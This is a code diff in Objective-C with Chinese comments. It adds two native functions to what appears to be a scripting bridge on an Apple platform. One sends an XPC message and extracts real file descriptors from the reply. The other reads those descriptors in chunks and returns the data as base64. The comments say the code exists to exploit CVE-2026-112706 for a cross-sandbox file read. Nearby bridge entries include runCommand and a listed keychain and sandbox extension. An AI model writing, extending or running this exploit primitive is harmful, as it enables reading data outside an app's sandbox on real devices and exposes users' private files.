@@ -1238,6 +1238,58 @@ static id xpcSendMsgNative(long h, NSDictionary *msg, double timeoutSec) {
     return reply;
 }
 
+// 结构化收发并抽取回包中的真实 fd（解锁 CVE-2026-112706 跨沙盒读）：
+// reply 是含 FD 类型的 xpc dict，xpcToObj 会把 FD 序列化为 "<fd>" 占位字符串而丢弃真实 fd。
+// 故在回包回调内、xpcToObj 序列化之前，对 fdKeys 逐个调用 xpc_dictionary_dup_fd 取真实 fd（int）。
+// 只给读：dup_fd 复制内核已打开的 fd，不改任何状态，符合红线（不写/System、不碰守护态）。
+// fdKeys=nil 时退化为普通 xpcSendMsg（返回 {reply, fds:{}}），调用方无需分支。
+static NSDictionary *xpcSendMsgFdNative(long h, NSDictionary *msg, double timeoutSec, NSArray *fdKeys) {
+    if (![msg isKindOfClass:[NSDictionary class]]) return @{@"err": @"msg-not-dict"};
+    id v = xpcConnGet(h);
+    if (!v) return @{@"err": @"bad-handle"};
+    xpc_connection_t c = (xpc_connection_t)v;
+    xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+    for (NSString *k in msg) xpc_dictionary_set_value(m, [k UTF8String], xpcFromObj(msg[k]));
+    if (timeoutSec <= 0) {
+        xpc_connection_send_message(c, m);
+        return @{@"sent": @YES};
+    }
+    __block id reply = nil;
+    __block NSDictionary *fds = @{};
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    xpc_connection_send_message_with_reply(c, m, dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0), ^(xpc_object_t r) {
+        // raw reply 在回调存活期内先抽 fd，再做整体序列化（避免 xpcToObj 把 FD 变成占位串）
+        if (fdKeys && [fdKeys isKindOfClass:[NSArray class]] && [fdKeys count] && xpc_get_type(r) == XPC_TYPE_DICTIONARY) {
+            NSMutableDictionary *mf = [NSMutableDictionary dictionary];
+            for (id kk in fdKeys) {
+                if (![kk isKindOfClass:[NSString class]]) continue;
+                int fd = xpc_dictionary_dup_fd(r, [kk UTF8String]);
+                mf[kk] = @(fd); // -1 = 该 key 无 FD 或抽取失败
+            }
+            fds = [mf copy];
+        }
+        reply = xpcToObj(r, 0);
+        dispatch_semaphore_signal(sem);
+    });
+    dispatch_time_t t = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(timeoutSec * NSEC_PER_SEC));
+    if (dispatch_semaphore_wait(sem, t) != 0) return @{@"err": @"timeout"};
+    return @{@"reply": reply ?: @{}, @"fds": fds};
+}
+
+// 只读分块读：对 dup_fd 得到的 fd 做 pread，返回 base64（CVE 跨沙盒读落地）。
+// 只给读：pread 不改文件、不改任何状态；offset/len 由调用方控制，最大 16MB 防内存炸。
+static NSDictionary *fdPreadNative(int fd, long long offset, long long len) {
+    if (fd < 0) return @{@"err": @"bad-fd"};
+    if (len <= 0 || len > 16*1024*1024) return @{@"err": @"bad-len"};
+    void *buf = malloc((size_t)len);
+    if (!buf) return @{@"err": @"oom"};
+    ssize_t n = pread(fd, buf, (size_t)len, (off_t)offset);
+    if (n < 0) { free(buf); return @{@"err": @"pread-failed", @"errno": @(errno)}; }
+    NSData *d = [NSData dataWithBytes:buf length:(NSUInteger)n];
+    free(buf);
+    return @{@"ok": @YES, @"len": @(n), @"b64": [d base64EncodedStringWithOptions:0]};
+}
+
 // bootstrap_look_up 原始版: 回传 kr + port 名(uint32 句柄)，供探针比对服务可达性与句柄分配
 static NSDictionary *machLookUpNative(NSString *svc) {
     mach_port_t bp = MACH_PORT_NULL;
@@ -2945,6 +2997,8 @@ ctx[@"runCommand"]=^NSString*(NSString *cmd){
             // ---- V2 扩展桥（2026-09-13）: XPC 结构化 / dyld 符号 / 沙盒 / 钥匙串 / 进程 ----
             ctx[@"xpcConn"]=^(NSString *svc){ return xpcConnNative(svc); };
             ctx[@"xpcSendMsg"]=^(NSNumber *h, NSDictionary *msg, NSNumber *timeoutSec){ return xpcSendMsgNative([h longValue], msg, [timeoutSec doubleValue]); };
+            ctx[@"xpcSendMsgFd"]=^(NSNumber *h, NSDictionary *msg, NSNumber *timeoutSec, NSArray *fdKeys){ return xpcSendMsgFdNative([h longValue], msg, [timeoutSec doubleValue], fdKeys); };
+            ctx[@"fdPread"]=^(NSNumber *fdN, NSNumber *offsetN, NSNumber *lenN){ return fdPreadNative((int)[fdN intValue], [offsetN longLongValue], [lenN longLongValue]); };
             ctx[@"xpcClose"]=^(NSNumber *h){ return xpcCloseNative([h longValue]); };
             ctx[@"machLookUp"]=^(NSString *svc){ return machLookUpNative(svc); };
             ctx[@"dlopenFW"]=^(NSString *p, NSNumber *mode){ return dlopenFWNative(p, [mode intValue]); };
